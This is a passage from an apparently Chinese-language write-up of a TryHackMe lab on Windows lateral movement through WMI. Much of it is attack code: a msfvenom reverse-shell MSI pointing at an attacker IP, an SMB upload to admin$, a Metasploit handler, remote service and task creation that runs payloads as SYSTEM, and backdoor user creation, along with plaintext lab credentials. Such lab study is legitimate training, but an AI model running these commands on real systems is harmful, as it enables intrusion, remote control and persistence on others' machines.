<span class="line"><span style="color: #ABB2BF"># 注意这个 flag 必须要通过服务生成的 Shell 才能执行</span></span>
<span class="line"><span style="color: #ABB2BF"># 刚开始还以为和执行的用户有关</span></span>
<span class="line"><span style="color: #ABB2BF"># whoami 是 SYSTEM 执行他也能出 flag</span></span>
<span class="line"><span style="color: #ABB2BF"># 尝试过 PSEXEC 和 nc 反弹 shell 都不行</span></span>
<span class="line"><span style="color: #ABB2BF"># 生成普通马然后创建服务执行也不行 必须要服务马</span></span>
<span class="line"><span style="color: #ABB2BF"># 执行 Flag.exe</span></span>
<span class="line"><span style="color: #ABB2BF">c:\</span><span style="color: #E06C75">Users</span><span style="color: #ABB2BF">\t1_leonard.</span><span style="color: #E06C75">summers</span><span style="color: #ABB2BF">\</span><span style="color: #E06C75">Desktop</span><span style="color: #ABB2BF">\Flag.exe</span></span></code></pre></div></div></figure>

<h2 id="通过-WMI-横向移动"><a href="#通过-WMI-横向移动" class="headerlink" title="通过 WMI 横向移动"></a>通过 WMI 横向移动</h2><p>WMI (Windows Management Instrumentation) 是 Windows 对 WBEM (Web-Based Enterprise Management) 的实现。WBEM 是一项用于跨设备访问管理信息的企业标准。</p>
<p>所有的操作都需要 <strong>Administrators 组</strong>的权限。</p>
<h3 id="通过-PowerShell-连接-WMI"><a href="#通过-PowerShell-连接-WMI" class="headerlink" title="通过 PowerShell 连接 WMI"></a>通过 PowerShell 连接 WMI</h3><p>同样要创建 PSCredential 对象。</p>
<figure class="shiki powershell"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #E06C75">$username</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&#39;Administrator&#39;</span><span style="color: #ABB2BF">;</span></span>
<span class="line"><span style="color: #E06C75">$password</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&#39;Mypass123&#39;</span><span style="color: #ABB2BF">;</span></span>
<span class="line"><span style="color: #E06C75">$securePassword</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">ConvertTo-SecureString</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">$password</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">AsPlainText </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">Force;</span></span>
<span class="line"><span style="color: #E06C75">$credential</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">New-Object</span><span style="color: #ABB2BF"> System.Management.Automation.PSCredential </span><span style="color: #E06C75">$username</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">$securePassword</span><span style="color: #ABB2BF">;</span></span></code></pre></div></div></figure>

<p>可以通过下面的任意一个协议建立 WMI 会话</p>
<ul>
<li><strong>DCOM:</strong> RPC over IP will be used for connecting to WMI. This protocol uses port 135&#x2F;TCP and ports 49152-65535&#x2F;TCP, just as explained when using sc.exe.</li>
<li><strong>Wsman:</strong> WinRM will be used for connecting to WMI. This protocol uses ports 5985&#x2F;TCP (WinRM HTTP) or 5986&#x2F;TCP (WinRM HTTPS).</li>
</ul>
<figure class="shiki powershell"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #E06C75">$Opt</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">New-CimSessionOption</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">Protocol DCOM</span></span>
<span class="line"><span style="color: #E06C75">$Session</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">New-Cimsession</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">ComputerName TARGET </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">Credential </span><span style="color: #E06C75">$credential</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">SessionOption </span><span style="color: #E06C75">$Opt</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">ErrorAction Stop</span></span></code></pre></div></div></figure>

<p><code>New-CimSessionOption</code> 是配置 WMI 会话连接参数，然后将选项和凭证传递给 <code>New-CimSession</code> cmdlet，以建立远程主机会话。</p>
<h4 id="通过-WMI-远程创建进程"><a href="#通过-WMI-远程创建进程" class="headerlink" title="通过 WMI 远程创建进程"></a>通过 WMI 远程创建进程</h4><ul>
<li>Ports:<ul>
<li>135&#x2F;TCP, 49152-65535&#x2F;TCP (DCERPC)</li>
<li>5985&#x2F;TCP (WinRM HTTP) or 5986&#x2F;TCP (WinRM HTTPS)</li>
</ul>
</li>
<li><strong>Required Group Memberships:</strong> Administrators</li>
</ul>
<p>我们可以利用 Windows 管理工具（WMI）从 Powershell 远程启动进程，向 Win32_Process 类发送 WMI 请求，在我们之前创建的会话下启动进程。WMI 不会回显，不会看到任何输出</p>
<figure class="shiki powershell"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #7F848E; font-style: italic"># 创建 text.txt 写入 munrawashere</span></span>
<span class="line"><span style="color: #E06C75">$Command</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;powershell.exe -Command Set-Content -Path C:\text.txt -Value munrawashere&quot;</span><span style="color: #ABB2BF">;</span></span>
<span class="line"></span>
<span class="line"><span style="color: #7F848E; font-style: italic"># 执行小马 必须要完整路径</span></span>
<span class="line"><span style="color: #E06C75">$Command</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;C:\Windows\payload.exe&quot;</span><span style="color: #ABB2BF">;</span></span>
<span class="line"></span>
<span class="line"><span style="color: #56B6C2">Invoke-CimMethod</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">CimSession </span><span style="color: #E06C75">$Session</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">ClassName Win32_Process </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">MethodName Create </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">Arguments </span><span style="color: #C678DD">@</span><span style="color: #ABB2BF">{</span></span>
<span class="line"><span style="color: #ABB2BF">    </span><span style="color: #E06C75">CommandLine</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">$Command</span></span>
<span class="line"><span style="color: #ABB2BF">}</span></span>
<span class="line"></span>
<span class="line"><span style="color: #7F848E; font-style: italic"># 旧环境执行方法</span></span>
<span class="line"><span style="color: #56B6C2">wmic.exe</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">/</span><span style="color: #ABB2BF">user:Administrator </span><span style="color: #56B6C2">/</span><span style="color: #ABB2BF">password:Mypass123 </span><span style="color: #56B6C2">/</span><span style="color: #ABB2BF">node:TARGET </span><span style="color: #C678DD">process</span><span style="color: #ABB2BF"> call create </span><span style="color: #98C379">&quot;cmd.exe /c calc.exe&quot;</span><span style="color: #ABB2BF"> </span></span>
<span class="line"></span>
<span class="line"><span style="color: #7F848E; font-style: italic"># 我跑不起来 提示 Access denied</span></span>
<span class="line"><span style="color: #56B6C2">wmic.exe</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">/</span><span style="color: #ABB2BF">user:</span><span style="color: #56B6C2">ZA.TRYHACKME.COM</span><span style="color: #ABB2BF">\t1_corine.waters </span><span style="color: #56B6C2">/</span><span style="color: #ABB2BF">password:Korine.</span><span style="color: #D19A66">1994</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">/</span><span style="color: #ABB2BF">node:</span><span style="color: #56B6C2">THMIIS.za.tryhackme.com</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">process</span><span style="color: #ABB2BF"> call create </span><span style="color: #98C379">&quot;C:\Windows\payload.exe&quot;</span></span></code></pre></div></div></figure>

<h4 id="通过-WMI-远程创建服务"><a href="#通过-WMI-远程创建服务" class="headerlink" title="通过 WMI 远程创建服务"></a>通过 WMI 远程创建服务</h4><figure class="shiki powershell"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #7F848E; font-style: italic"># 创建一个 THMService2 的服务</span></span>
<span class="line"><span style="color: #56B6C2">Invoke-CimMethod</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">CimSession </span><span style="color: #E06C75">$Session</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">ClassName Win32_Service </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">MethodName Create </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">Arguments </span><span style="color: #C678DD">@</span><span style="color: #ABB2BF">{</span></span>
<span class="line"><span style="color: #E06C75">Name</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;THMService2&quot;</span><span style="color: #ABB2BF">;</span></span>
<span class="line"><span style="color: #E06C75">DisplayName</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;THMService2&quot;</span><span style="color: #ABB2BF">;</span></span>
<span class="line"><span style="color: #E06C75">PathName</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;net user munra2 Pass123 /add&quot;</span><span style="color: #ABB2BF">; </span><span style="color: #7F848E; font-style: italic"># Your payload</span></span>
<span class="line"><span style="color: #E06C75">ServiceType</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> [</span><span style="color: #C678DD">byte</span><span style="color: #ABB2BF">]::Parse(</span><span style="color: #98C379">&quot;16&quot;</span><span style="color: #ABB2BF">); </span><span style="color: #7F848E; font-style: italic"># Win32OwnProcess : Start service in a new process</span></span>
<span class="line"><span style="color: #E06C75">StartMode</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;Manual&quot;</span></span>
<span class="line"><span style="color: #ABB2BF">}</span></span>
<span class="line"></span>
<span class="line"><span style="color: #7F848E; font-style: italic"># 创建一个执行小马的服务</span></span>
<span class="line"><span style="color: #56B6C2">Invoke-CimMethod</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">CimSession </span><span style="color: #E06C75">$Session</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">ClassName Win32_Service </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">MethodName Create </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">Arguments </span><span style="color: #C678DD">@</span><span style="color: #ABB2BF">{</span></span>
<span class="line"><span style="color: #E06C75">Name</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;THMService2&quot;</span><span style="color: #ABB2BF">;</span></span>
<span class="line"><span style="color: #E06C75">DisplayName</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;THMService2&quot;</span><span style="color: #ABB2BF">;</span></span>
<span class="line"><span style="color: #E06C75">PathName</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;%windir%\payload.exe&quot;</span><span style="color: #ABB2BF">;</span></span>
<span class="line"><span style="color: #E06C75">ServiceType</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> [</span><span style="color: #C678DD">byte</span><span style="color: #ABB2BF">]::Parse(</span><span style="color: #98C379">&quot;16&quot;</span><span style="color: #ABB2BF">);</span></span>
<span class="line"><span style="color: #E06C75">StartMode</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;Manual&quot;</span></span>
<span class="line"><span style="color: #ABB2BF">}</span></span>
<span class="line"></span>
<span class="line"><span style="color: #7F848E; font-style: italic"># 启动服务</span></span>
<span class="line"><span style="color: #E06C75">$Service</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">Get-CimInstance</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">CimSession </span><span style="color: #E06C75">$Session</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">ClassName Win32_Service </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">filter </span><span style="color: #98C379">&quot;Name LIKE &#39;THMService2&#39;&quot;</span></span>
<span class="line"><span style="color: #56B6C2">Invoke-CimMethod</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">InputObject </span><span style="color: #E06C75">$Service</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">MethodName StartService</span></span>
<span class="line"></span>
<span class="line"><span style="color: #7F848E; font-style: italic"># 停止和删除服务</span></span>
<span class="line"><span style="color: #56B6C2">Invoke-CimMethod</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">InputObject </span><span style="color: #E06C75">$Service</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">MethodName StopService</span></span>
<span class="line"><span style="color: #56B6C2">Invoke-CimMethod</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">InputObject </span><span style="color: #E06C75">$Service</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">MethodName Delete</span></span></code></pre></div></div></figure>

<p><strong>ServiceType &#x3D; [byte]::Parse(“16”)</strong> 是一个 PowerShell 表达式，用于指定 Windows 服务的类型。这里的 <code>16</code> 是一个代表特定服务类型的数值，它对应于 Windows API 中的 <code>SERVICE_WIN32_OWN_PROCESS</code> 常量。</p>
<p>在 Windows 服务编程中，服务的类型决定了服务如何运行：</p>
<ul>
<li><strong><code>ServiceType = 16</code> (十六进制 <code>0x10</code>)</strong>：代表 <strong><code>SERVICE_WIN32_OWN_PROCESS</code></strong>。这意味着服务将以<strong>独立进程</strong>的形式运行，拥有自己独立的内存空间。这是最常见的服务类型，也是这里所使用的。</li>
</ul>
<h4 id="通过-WMI-远程创建计划任务"><a href="#通过-WMI-远程创建计划任务" class="headerlink" title="通过 WMI 远程创建计划任务"></a>通过 WMI 远程创建计划任务</h4><figure class="shiki powershell"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #7F848E; font-style: italic"># Payload must be split in Command and Args</span></span>
<span class="line"><span style="color: #E06C75">$Command</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;cmd.exe&quot;</span></span>
<span class="line"><span style="color: #ABB2BF">$Args </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;/c net user munra22 aSdf1234 /add&quot;</span></span>
<span class="line"></span>
<span class="line"><span style="color: #E06C75">$Action</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">New-ScheduledTaskAction</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">CimSession </span><span style="color: #E06C75">$Session</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">Execute </span><span style="color: #E06C75">$Command</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">Argument $Args</span></span>
<span class="line"><span style="color: #56B6C2">Register-ScheduledTask</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">CimSession </span><span style="color: #E06C75">$Session</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">Action </span><span style="color: #E06C75">$Action</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">User </span><span style="color: #98C379">&quot;NT AUTHORITY\SYSTEM&quot;</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">TaskName </span><span style="color: #98C379">&quot;THMtask2&quot;</span></span>
<span class="line"></span>
<span class="line"><span style="color: #7F848E; font-style: italic"># 远程执行小马示例</span></span>
<span class="line"><span style="color: #E06C75">$Command</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;%windir%\payload.exe&quot;</span></span>
<span class="line"><span style="color: #E06C75">$Action</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">New-ScheduledTaskAction</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">CimSession </span><span style="color: #E06C75">$Session</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">Execute </span><span style="color: #E06C75">$Command</span></span>
<span class="line"><span style="color: #56B6C2">Register-ScheduledTask</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">CimSession </span><span style="color: #E06C75">$Session</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">Action </span><span style="color: #E06C75">$Action</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">User </span><span style="color: #98C379">&quot;NT AUTHORITY\SYSTEM&quot;</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">TaskName </span><span style="color: #98C379">&quot;THMtask2&quot;</span></span>
<span class="line"></span>
<span class="line"><span style="color: #7F848E; font-style: italic"># 启动计划任务</span></span>
<span class="line"><span style="color: #56B6C2">Start-ScheduledTask</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">CimSession </span><span style="color: #E06C75">$Session</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">TaskName </span><span style="color: #98C379">&quot;THMtask2&quot;</span></span>
<span class="line"></span>
<span class="line"><span style="color: #7F848E; font-style: italic"># 删除计划任务</span></span>
<span class="line"><span style="color: #56B6C2">Unregister-ScheduledTask</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">CimSession </span><span style="color: #E06C75">$Session</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">TaskName </span><span style="color: #98C379">&quot;THMtask2&quot;</span></span></code></pre></div></div></figure>

<h4 id="通过-WMI-安装-MSI-包"><a href="#通过-WMI-安装-MSI-包" class="headerlink" title="通过 WMI 安装 MSI 包"></a>通过 WMI 安装 MSI 包</h4><figure class="shiki powershell"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #56B6C2">Invoke-CimMethod</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">CimSession </span><span style="color: #E06C75">$Session</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">ClassName Win32_Product </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">MethodName Install </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">Arguments </span><span style="color: #C678DD">@</span><span style="color: #ABB2BF">{</span><span style="color: #E06C75">PackageLocation</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;C:\Windows\myinstaller.msi&quot;</span><span style="color: #ABB2BF">; </span><span style="color: #E06C75">Options</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;&quot;</span><span style="color: #ABB2BF">; </span><span style="color: #E06C75">AllUsers</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">$false</span><span style="color: #ABB2BF">}</span></span>
<span class="line"></span>
<span class="line"><span style="color: #7F848E; font-style: italic"># 传统方式实现</span></span>
<span class="line"><span style="color: #ABB2BF">wmic </span><span style="color: #56B6C2">/</span><span style="color: #ABB2BF">node:TARGET </span><span style="color: #56B6C2">/</span><span style="color: #ABB2BF">user:DOMAIN\USER product call install PackageLocation</span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF">c:\Windows\myinstaller.msi</span></span>
<span class="line"></span>
<span class="line"><span style="color: #7F848E; font-style: italic"># 同样跑不起来 Access Denied</span></span>
<span class="line"><span style="color: #ABB2BF">wmic </span><span style="color: #56B6C2">/</span><span style="color: #ABB2BF">node:</span><span style="color: #56B6C2">THMIIS.za.tryhackme.com</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">/</span><span style="color: #ABB2BF">user:</span><span style="color: #56B6C2">ZA.TRYHACKME.COM</span><span style="color: #ABB2BF">\t1_corine.waters </span><span style="color: #56B6C2">/</span><span style="color: #ABB2BF">password:Korine.</span><span style="color: #D19A66">1994</span><span style="color: #ABB2BF"> product call install PackageLocation</span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF">c:\Windows\myinstaller88.msi</span></span></code></pre></div></div></figure>

<h3 id="实践-1"><a href="#实践-1" class="headerlink" title="实践"></a>实践</h3><figure class="shiki sh"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #7F848E; font-style: italic"># 创建 MSI 马</span></span>
<span class="line"><span style="color: #61AFEF">msfvenom</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-p</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">windows/shell/reverse_tcp</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">LHOST=</span><span style="color: #D19A66">10.50</span><span style="color: #98C379">.46.241</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">LPORT=</span><span style="color: #D19A66">4444</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-f</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">msi</span><span style="color: #ABB2BF"> &gt; </span><span style="color: #98C379">myinstaller88.msi</span></span>
<span class="line"></span>
<span class="line"><span style="color: #7F848E; font-style: italic"># 传 MSI 马</span></span>
<span class="line"><span style="color: #61AFEF">smbclient</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-c</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&#39;put myinstaller88.msi&#39;</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-U</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">t1_corine.waters</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-W</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">ZA</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&#39;//thmiis.za.tryhackme.com/admin$/&#39;</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">Korine.1994</span></span>
<span class="line"></span>
<span class="line"><span style="color: #7F848E; font-style: italic"># 创建好 handler</span></span>
<span class="line"><span style="color: #61AFEF">msfconsole</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-q</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-x</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;use exploit/multi/handler; set payload windows/shell/reverse_tcp; set LHOST lateralmovement; set LPORT 4444;exploit&quot;</span></span>
<span class="line"></span>
<span class="line"><span style="color: #7F848E; font-style: italic"># 配好 WMI session</span></span>
<span class="line"><span style="color: #7F848E; font-style: italic"># 注意我这里用的 Wsman 协议 官方 WP 是 DCOM</span></span>
<span class="line"><span style="color: #E06C75">$username</span><span style="color: #ABB2BF"> = </span><span style="color: #98C379">&#39;t1_corine.waters&#39;</span><span style="color: #ABB2BF">;</span></span>
<span class="line"><span style="color: #E06C75">$password</span><span style="color: #ABB2BF"> = </span><span style="color: #98C379">&#39;Korine.1994&#39;</span><span style="color: #ABB2BF">;</span></span>
<span class="line"><span style="color: #E06C75">$securePassword</span><span style="color: #ABB2BF"> = ConvertTo-SecureString </span><span style="color: #E06C75">$password</span><span style="color: #ABB2BF"> -AsPlainText -Force;</span></span>
<span class="line"><span style="color: #E06C75">$credential</span><span style="color: #ABB2BF"> = New-Object System.Management.Automation.PSCredential </span><span style="color: #E06C75">$username</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">$securePassword</span><span style="color: #ABB2BF">;</span></span>
<span class="line"><span style="color: #E06C75">$Opt</span><span style="color: #ABB2BF"> = New-CimSessionOption -Protocol Wsman</span></span>
<span class="line"><span style="color: #E06C75">$Session</span><span style="color: #ABB2BF"> = New-Cimsession -ComputerName thmiis.za.tryhackme.com -Credential </span><span style="color: #E06C75">$credential</span><span style="color: #ABB2BF"> -SessionOption </span><span style="color: #E06C75">$Opt</span><span style="color: #ABB2BF"> -ErrorAction Stop</span></span>
<span class="line"></span>
<span class="line"><span style="color: #7F848E; font-style: italic"># 执行 WMI 触发 payload</span></span>
<span class="line"><span style="color: #61AFEF">Invoke-CimMethod</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-CimSession</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">$Session</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-ClassName</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">Win32_Product</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-MethodName</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">Install</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-Arguments</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">@{PackageLocation</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">=</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;C:\Windows\myinstaller88.msi&quot;</span><span style="color: #ABB2BF">; </span><span style="color: #61AFEF">Options</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">=</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;&quot;</span><span style="color: #ABB2BF">; </span><span style="color: #61AFEF">AllUsers</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">=</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">$false</span><span style="color: #98C379">}</span></span>
<span class="line"></span>
<span class="line"><span style="color: #7F848E; font-style: italic"># 这关也很奇怪，只能跟着 WP 来</span></span>
<span class="line"><span style="color: #7F848E; font-style: italic"># 自己的解法都拿不到 Flag</span></span>
<span class="line"><span style="color: #7F848E; font-style: italic"># 执行 Flag.exe</span></span>
